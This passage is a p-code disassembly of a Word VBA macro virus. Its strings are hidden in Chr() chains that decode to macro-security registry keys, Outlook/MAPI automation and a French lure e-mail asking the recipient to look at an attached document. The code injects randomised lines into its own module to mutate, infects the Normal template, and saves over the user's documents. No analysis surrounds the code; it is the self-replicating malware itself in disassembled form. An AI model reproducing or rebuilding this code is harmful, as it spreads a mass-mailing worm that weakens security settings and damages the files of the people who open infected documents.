' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St c9 
' 	QuoteRem 0x004C 0x000B " acmymylquw"
' Line #94:
' 	LitDI2 0x000C 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0004 
' 	Add 
' 	FnInt 
' 	St e6 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld e6 
' 	For 
' 	QuoteRem 0x002B 0x0010 " esluvtkunzytcaa"
' Line #95:
' 	Ld c9 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0061 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c9 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld d5 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld c6 
' 	Ld c9 
' 	Ld f5 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' 	QuoteRem 0x005C 0x0006 " zmfvf"
' Line #96:
' 	LineCont 0x0004 15 00 00 00
' 	Ld c6 
' 	LitDI2 0x0001 
' 	Add 
' 	St c6 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St c9 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' 	BoS 0x0000 
' 	Ld b8 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x000E 0x0007 " eshtvk"
' Line #97:
' 	ExitDo 
' 	BoS 0x0000 
' 	EndSelect 
' 	QuoteRem 0x0014 0x0008 " poerdyl"
' Line #98:
' 	Loop 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld l2 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000E 0x0008 " dcqdxzt"
' Line #99:
' 	Ld k3 
' 	MemLd New 
' 	SelectCase 
' 	QuoteRem 0x0014 0x000A " jthqcvmhy"
' Line #100:
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	BoS 0x0000 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld i6 
' 	MemLd New 
' 	SelectCase 
' 	BoS 0x0000 
' 	Ld g6 
' 	CaseNe 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld g6 
' 	Ld f5 
' 	MemSt New 
' 	QuoteRem 0x006F 0x000A " hoebqzvxd"
' Line #101:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	QuoteRem 0x0055 0x000E " xwwhkonjfknfi"
' Line #102:
' 	LineCont 0x0008 07 00 00 00 14 00 00 00
' 	EndSelect 
' 	BoS 0x0000 
' 	CaseElse 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld m1 
' 	FnInStr3 
' 	SelectCase 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	ArgsLd Rnd 0x0000 
' 	SelectCase 
' 	QuoteRem 0x0019 0x0005 " adiy"
' Line #103:
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F8E 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld h8 
' 	Ld l5 
' 	Add 
' 	Ld i1 
' 	Add 
' 	Ld i7 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	Ld g5 
' 	Ld e1 
' 	Add 
' 	Ld m4 
' 	Add 
' 	Ld b3 
' 	Add 
' 	Ld d4 
' 	Add 
' 	Ld f7 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0056 0x0010 " pajeigscntbvnrs"
' Line #104:
' 	Ld i3 
' 	Ld g2 
' 	Add 
' 	Ld e5 
' 	Add 
' 	Ld d2 
' 	Add 
' 	Ld a4 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0022 0x000A " ipnrsuabe"
' Line #105:
' 	Ld a3 
' 	Ld a2 
' 	Add 
' 	Ld c2 
' 	Add 
' 	Ld d1 
' 	Add 
' 	Ld c3 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0022 0x000B " nxiuynvjff"
' Line #106:
' 	Ld c1 
' 	Ld b2 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsCall MsgBox 0x0002 
' 	QuoteRem 0x0013 0x0005 " rodg"
' Line #107:
' 	Ld b1 
' 	Ld a1 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' 	BoS 0x0000 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3F9E 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x0023 0x000C " egykvvzierc"
' Line #108:
' 	Ld b9 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	QuoteRem 0x0016 0x000C " ikfnkidxvkz"
' Line #109:
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FA7 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld a7 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	LitR8 0x1EB8 0xEB85 0xB851 0x3FAE 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld d6 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	LitR8 0x3333 0x3333 0x3333 0x3FB3 
' 	CaseLt 
' 	CaseDone 
' 	QuoteRem 0x005F 0x000B " bdcfyvidoz"
' Line #110:
' 	Ld c5 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	LitR8 0xD70A 0x70A3 0x0A3D 0x3FB7 
' 	CaseLt 
' 	CaseDone 
' 	BoS 0x0000 
' 	Ld e2 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSelect 
' 	BoS 0x0000 
' 	EndSub 
' 	QuoteRem 0x00C0 0x0005 " umpw"
' Line #111:
' 	FuncDefn (Private Sub f1())
' 	QuoteRem 0x0011 0x0009 " vpgsmkxs"
' Line #112:
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h7 
' 	QuoteRem 0x0037 0x0009 " waohhgok"
' Line #113:
' 	LineCont 0x0004 1F 00 00 00
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g8 
' 	QuoteRem 0x0034 0x000A " jjoyywqij"
' Line #114:
' 	LineCont 0x000C 2E 00 00 00 50 00 00 00 6E 00 00 00
' 	LitStr 0x0000 ""
' 	St j1 
' 	BoS 0x0000 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	QuoteRem 0x007C 0x000F " gfqbjmahtlciro"
' Line #115:
' 	LineCont 0x000C 3E 00 00 00 4E 00 00 00 B3 00 00 00
' 	Ld k2 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0030 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0057 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	Ld k2 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k2 
' 	BoS 0x0000 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j8 
' 	QuoteRem 0x0014 0x0005 " hxsa"
' Line #116:
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l1 
' 	QuoteRem 0x0039 0x0006 " tzjor"
' Line #117:
' 	LitDI2 0x0000 
' 	St m5 
' 	BoS 0x0000 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0050 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St l8 
' 	QuoteRem 0x0033 0x000A " fhdscnsjq"
' Line #118:
' 	LineCont 0x0004 02 00 00 00
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	QuoteRem 0x0069 0x0010 " gidrlhxoimcuiky"
' Line #119:
' 	LineCont 0x0010 3C 00 00 00 3D 00 00 00 47 00 00 00 D9 00 00 00
' 	Ld a5 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St a5 
' 	BoS 0x0000 
' 	LitDI2 0x0048 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	Ld d3 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	QuoteRem 0x006C 0x0007 " scuzkf"
' Line #120:
' 	LineCont 0x0010 0D 00 00 00 19 00 00 00 41 00 00 00 47 00 00 00
' 	Ld d3 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St d3 
' 	BoS 0x0000 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g6 
' 	BoS 0x0000 
' 	LitStr 0x0003 "Non"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Service"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "National"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "-"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "Oui"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St h3 
' 	QuoteRem 0x0020 0x000C " xmuvlclnkdr"
' Line #121:
' 	LineCont 0x0004 0C 00 00 00
' 	Ld h3 
' 	LitStr 0x0002 "au"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Contrat"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "Travail"
' 	Add 
' 	St h3 
' 	QuoteRem 0x0027 0x0007 " swmzmd"
' Line #122:
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k1 
' 	QuoteRem 0x004F 0x0007 " hvaqel"
' Line #123:
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St k5 
' 	QuoteRem 0x0050 0x000A " oeotmgyxh"
' Line #124:
' 	LineCont 0x000C 06 00 00 00 0B 00 00 00 30 00 00 00
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St g3 
' 	BoS 0x0000 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St n6 
' 	BoS 0x0000 
' 	LitStr 0x000D "Suggestion..."
' 	St h5 
' 	QuoteRem 0x002C 0x0010 " takneifhvyrxsdz"
' Line #125:
' 	LitStr 0x0002 "Ce"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "document"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "("
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0001 ")"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "vaut"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "bien"
' 	Add 
' 	St j5 
' 	QuoteRem 0x0073 0x000A " iusorhpwl"
' Line #126:
' 	LineCont 0x000C 04 00 00 00 3D 00 00 00 62 00 00 00
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "un"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "petit"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "coup"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "d"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0005 "oeil."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "J"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "aimerais"
' 	Add 
' 	St j5 
' 	BoS 0x0000 
' 	Ld j5 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "savoir"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "il"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "correspond"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "à"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "ce"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	BoS 0x0000 
' 	Ld j5 
' 	LitStr 0x0002 "qu"
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "on"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "attends"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "de"
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "lui."
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St j5 
' 	QuoteRem 0x006F 0x0009 " cohvhynh"
' Line #127:
' 	LitDI2 0x0044 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
